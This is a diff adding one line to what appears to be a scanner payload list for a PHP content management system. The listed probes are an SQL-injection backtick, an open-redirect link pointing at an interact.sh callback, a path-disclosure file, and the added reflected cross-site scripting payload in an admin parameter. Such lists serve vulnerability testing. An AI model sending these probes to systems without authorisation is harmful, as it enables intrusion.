@@ -2,3 +2,4 @@
 /include/downmix.inc.php
 /member/ajax_membergroup.php?action=post&membergroup=@`
 /plus/download.php?open=1&link=aHR0cHM6Ly9pbnRlcmFjdC5zaA==
+/include/dialog/config.php?adminDirHand=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
